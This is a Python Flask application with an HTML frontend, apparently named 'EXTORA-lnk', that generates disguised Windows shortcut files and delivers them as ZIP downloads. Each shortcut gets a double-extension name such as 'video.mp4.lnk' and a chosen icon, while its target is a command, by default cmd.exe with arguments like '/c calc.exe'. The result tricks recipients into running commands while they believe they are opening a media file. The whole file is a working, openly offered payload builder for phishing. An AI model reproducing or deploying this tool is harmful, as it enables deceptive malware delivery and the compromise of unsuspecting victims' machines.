import io
import re
import os
import zipfile
from flask import Flask, request, Response, jsonify

app = Flask(__name__)

try:
    from lnksmith import build_lnk
    _HAS_LNKSMITH = True
except ImportError:
    _HAS_LNKSMITH = False
    try:
        from pylnk3 import Lnk
        _HAS_PYLNK3 = True
    except ImportError:
        _HAS_PYLNK3 = False


def _build_lnk(target: str, arguments: str = "", icon_env: str = "") -> bytes:
    if _HAS_LNKSMITH:
        kwargs = {"target": target, "show_command": 1}
        if arguments:
            kwargs["arguments"] = arguments
        if icon_env:
            kwargs["icon_env"] = icon_env   # requires lnksmith >= 1.0.3
        return build_lnk(**kwargs)

    if _HAS_PYLNK3:
        lnk = Lnk()
        lnk.path = target
        if arguments:
            lnk.arguments = arguments
        if icon_env:
            lnk.icon = icon_env
        buf = io.BytesIO()
        lnk.save(buf)
        return buf.getvalue()

    raise RuntimeError("No LNK library available (install lnksmith or pylnk3)")


_ILLEGAL_FILENAME = re.compile(r'[<>:"/\\|?*\x00-\x1f]')
_RESERVED_NAMES = {
    "CON", "PRN", "AUX", "NUL",
    "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
    "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
}


def _sanitize_zip_name(raw: str, fallback: str) -> str:
    name = (raw or "").strip() or fallback
    name = re.sub(r"\.(zip|lnk|download)$", "", name, flags=re.IGNORECASE)
    name = _ILLEGAL_FILENAME.sub("", name).strip(" .")
    if not name:
        name = fallback
    if name.upper() in _RESERVED_NAMES:
        name = "_" + name
    if len(name) > 200:
        name = name[:200]
    return name


@app.route("/api/generate", methods=["POST"])
def generate():
    target = (request.form.get("target") or "").strip()
    args = (request.form.get("args") or "").strip()
    display = (request.form.get("display") or "video.mp4").strip()
    icon_path_raw = (request.form.get("icon") or "").strip()
    zip_name_raw = (request.form.get("zip_name") or "").strip()
    icon_file = request.files.get("icon_file")

    if not target:
        return jsonify({"error": "target required"}), 400

    display = re.sub(r"\.(download|lnk|zip)$", "", display, flags=re.IGNORECASE)
    display = _ILLEGAL_FILENAME.sub("", display).strip(" .") or "video.mp4"
    lnk_filename = display + ".lnk"

    zip_base = _sanitize_zip_name(zip_name_raw, display)
    zip_filename = zip_base + ".zip"

    icon_env = ""
    icon_bytes = None
    icon_zip_name = None
    icon_source = "none"

    if icon_file and icon_file.filename:
        icon_bytes = icon_file.read()
        ext = os.path.splitext(icon_file.filename)[1].lower()
        if ext not in (".ico", ".png", ".exe", ".dll"):
            ext = ".ico"
        icon_zip_name = "icon" + ext
        icon_env = icon_zip_name          # bare filename, resolved relative to .lnk
        icon_source = "upload"
    elif icon_path_raw:
        icon_env = icon_path_raw
        icon_source = "path"

    try:
        lnk_bytes = _build_lnk(target, args, icon_env)
    except Exception as e:
        return jsonify({"error": "lnk build failed: " + str(e)}), 500

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr(lnk_filename, lnk_bytes)
        if icon_bytes is not None:
            zf.writestr(icon_zip_name, icon_bytes)
    zip_bytes = buf.getvalue()

    return Response(
        zip_bytes,
        mimetype="application/zip",
        headers={
            "Content-Disposition": f'attachment; filename="{zip_filename}"',
            "Content-Length": str(len(zip_bytes)),
            "Cache-Control": "no-store",
            "X-Content-Type-Options": "nosniff",
            "X-Icon-Source": icon_source,
            "X-Zip-Name": zip_filename,
        },
    )


@app.route("/api/health", methods=["GET"])
def health():
    return jsonify({
        "ok": True,
        "lnksmith": _HAS_LNKSMITH,
        "pylnk3": _HAS_PYLNK3,
    })


# ---------- FRONTEND (unchanged) ----------
_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Extora-lnk</title>
<style>
  :root {
    --bg: #0a0a0f; --surface: #12121a; --surface-2: #1a1a26;
    --border: #2a2a3a; --text: #e0e0e8; --muted: #70708a;
    --accent: #7c5cff; --accent-2: #00e0b0; --danger: #ff4d6d;
  }
  * { box-sizing: border-box; }
  html, body { margin: 0; padding: 0; }
  body {
    font-family: ui-monospace, 'SF Mono', 'Cascadia Code', Menlo, monospace;
    background:
      radial-gradient(ellipse 80% 50% at 50% -10%, rgba(124,92,255,0.12), transparent),
      radial-gradient(ellipse 60% 40% at 90% 100%, rgba(0,224,176,0.06), transparent),
      var(--bg);
    color: var(--text); min-height: 100vh;
    display: flex; align-items: flex-start; justify-content: center;
    padding: 3rem 1rem;
  }
  .card {
    width: 100%; max-width: 600px; background: var(--surface);
    border: 1px solid var(--border); border-radius: 12px; padding: 2rem;
    box-shadow: 0 0 0 1px rgba(124,92,255,0.04), 0 24px 60px -20px rgba(0,0,0,0.8);
  }
  h1 {
    margin: 0 0 0.25rem; font-size: 1.75rem; letter-spacing: 0.08em;
    background: linear-gradient(90deg, var(--accent), var(--accent-2));
    -webkit-background-clip: text; background-clip: text;
    -webkit-text-fill-color: transparent;
  }
  .sub { color: var(--muted); font-size: 0.75rem; margin: 0 0 1.75rem; letter-spacing: 0.02em; }
  label {
    display: block; margin: 1.1rem 0 0.4rem; font-size: 0.72rem;
    text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted);
  }
  input[type="text"], input[type="file"] {
    width: 100%; padding: 0.6rem 0.75rem; background: var(--surface-2);
    border: 1px solid var(--border); border-radius: 8px; color: var(--text);
    font-family: inherit; font-size: 0.85rem; transition: border-color 0.15s;
  }
  input[type="text"]:focus {
    outline: none; border-color: var(--accent);
    box-shadow: 0 0 0 3px rgba(124,92,255,0.15);
  }
  input[type="file"] { padding: 0.5rem; font-size: 0.78rem; cursor: pointer; }
  input[type="file"]::file-selector-button {
    background: var(--border); color: var(--text); border: none;
    padding: 0.35rem 0.75rem; border-radius: 6px;
    font-family: inherit; font-size: 0.78rem; cursor: pointer; margin-right: 0.75rem;
  }
  input[type="file"]::file-selector-button:hover { background: var(--accent); color: #fff; }
  button {
    margin-top: 1.75rem; width: 100%; padding: 0.85rem 1.5rem;
    font-size: 0.85rem; font-family: inherit; letter-spacing: 0.08em;
    text-transform: uppercase; color: #fff;
    background: linear-gradient(135deg, var(--accent), #5a3fd6);
    border: none; border-radius: 8px; cursor: pointer;
    transition: transform 0.1s, box-shadow 0.15s, filter 0.15s;
    box-shadow: 0 4px 20px -4px rgba(124,92,255,0.5);
  }
  button:hover { filter: brightness(1.1); }
  button:active { transform: translateY(1px); }
  button:disabled { opacity: 0.5; cursor: not-allowed; }
  #status { margin-top: 1rem; font-size: 0.75rem; color: var(--accent-2); white-space: pre-wrap; min-height: 1.2em; }
  #status.error { color: var(--danger); }
  #infoBox {
    margin-top: 1rem; padding: 0.9rem 1rem;
    background: rgba(0,224,176,0.06); border: 1px solid rgba(0,224,176,0.25);
    border-radius: 8px; font-size: 0.72rem; color: var(--accent-2); line-height: 1.6;
  }
  #infoBox:empty { display: none; }
  #infoBox code { background: rgba(0,224,176,0.1); color: var(--accent-2); padding: 0.1rem 0.35rem; border-radius: 4px; }
  .hint { font-size: 0.65rem; color: var(--muted); margin-top: 0.25rem; }
  .credit {
    margin-top: 2rem; padding-top: 1rem; border-top: 1px solid var(--border);
    font-size: 0.7rem; color: var(--muted); text-align: center; letter-spacing: 0.04em;
  }
  .credit span { color: var(--accent); }
  code { background: var(--surface-2); padding: 0.1rem 0.35rem; border-radius: 4px; font-size: 0.85em; color: var(--accent-2); }
</style>
</head>
<body>
<div class="card">
  <h1>EXTORA-lnk</h1>
  <p class="sub">server-side double-extension <code>.lnk</code> generator (ZIP delivery)</p>

  <label for="targetPath">Target absolute path</label>
  <input type="text" id="targetPath" value="C:\Windows\System32\cmd.exe" spellcheck="false">

  <label for="args">Arguments</label>
  <input type="text" id="args" value="" placeholder="/c calc.exe" spellcheck="false">

  <label for="displayName">Display name (inside ZIP)</label>
  <input type="text" id="displayName" value="video.mp4" spellcheck="false">

  <label for="zipName">Output ZIP filename (without .zip)</label>
  <input type="text" id="zipName" value="video.mp4" spellcheck="false">
  <div class="hint">Leave empty to reuse display name. Illegal characters stripped server-side.</div>

  <label for="iconFile">Upload icon (.ico, .png, .exe, .dll)</label>
  <input type="file" id="iconFile" accept=".ico,.png,.exe,.dll">

  <label for="iconPath">Or: absolute icon path on target machine</label>
  <input type="text" id="iconPath" value="" placeholder="C:\Windows\System32\shell32.dll" spellcheck="false">

  <button id="generateBtn">Generate ZIP</button>
  <div id="status"></div>
  <div id="infoBox"></div>

  <div class="credit">Made By <span>Aryan Giri</span> | giriaryan694-a11y</div>
</div>

<script>
const iconFileEl = document.getElementById('iconFile');
const iconPathEl = document.getElementById('iconPath');
const displayEl = document.getElementById('displayName');
const zipNameEl = document.getElementById('zipName');
const infoBox = document.getElementById('infoBox');

function updateInfoBox() {
  const hasFile = iconFileEl.files && iconFileEl.files.length > 0;
  const hasPath = iconPathEl.value.trim().length > 0;

  if (hasFile && hasPath) {
    infoBox.innerHTML = '✓ Icon upload takes precedence over the absolute path.';
    return;
  }
  if (hasFile) {
    infoBox.innerHTML =
      '✓ Uploaded icon will be embedded in the ZIP next to the <code>.lnk</code>.<br>' +
      'Extract both files to the same folder before double-clicking.<br>' +
      'If the icon does not render, right-click the <code>.lnk</code> → Properties → Change Icon → browse to the extracted icon.';
    return;
  }
  if (hasPath) {
    infoBox.innerHTML =
      '✓ Using absolute icon path: <code>' + escapeHtml(iconPathEl.value.trim()) + '</code><br>' +
      'Resolves only if that file exists on the target machine.';
    return;
  }
  infoBox.innerHTML = '';
}

function escapeHtml(s) {
  return s.replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
}

let zipManuallyEdited = false;
zipNameEl.addEventListener('input', () => { zipManuallyEdited = true; });
displayEl.addEventListener('input', () => {
  if (!zipManuallyEdited) zipNameEl.value = displayEl.value;
});

iconFileEl.addEventListener('change', updateInfoBox);
iconPathEl.addEventListener('input', updateInfoBox);

document.getElementById('generateBtn').addEventListener('click', async () => {
  const status = document.getElementById('status');
  const btn = document.getElementById('generateBtn');
  status.className = '';
  status.textContent = 'Requesting...';
  btn.disabled = true;

  try {
    const form = new FormData();
    form.append('target', document.getElementById('targetPath').value.trim());
    form.append('args', document.getElementById('args').value.trim());
    form.append('display', displayEl.value.trim() || 'video.mp4');
    form.append('zip_name', zipNameEl.value.trim());
    form.append('icon', iconPathEl.value.trim());

    const file = iconFileEl.files[0];
    if (file) form.append('icon_file', file);

    if (!form.get('target')) {
      status.className = 'error';
      status.textContent = 'Error: target path required.';
      return;
    }

    const res = await fetch('/api/generate', { method: 'POST', body: form });

    if (!res.ok) {
      const err = await res.json().catch(() => ({ error: 'HTTP ' + res.status }));
      throw new Error(err.error || 'request failed');
    }

    const serverZipName = res.headers.get('X-Zip-Name') ||
      (form.get('zip_name') || form.get('display')).replace(/\.(zip|lnk|download)$/i, '') + '.zip';

    const blob = await res.blob();
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = serverZipName;
    a.rel = 'noopener';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    setTimeout(() => URL.revokeObjectURL(url), 1500);

    status.textContent = 'Done → ' + serverZipName + ' downloaded. Extract, then double-click the .lnk.';
  } catch (err) {
    status.className = 'error';
    status.textContent = 'Error: ' + err.message;
  } finally {
    btn.disabled = false;
  }
});
</script>
</body>
</html>
"""


@app.route("/", methods=["GET"])
def index():
    return Response(_HTML, mimetype="text/html")


if __name__ == "__main__":
    app.run(debug=True, port=int(os.environ.get("PORT", 5000)))
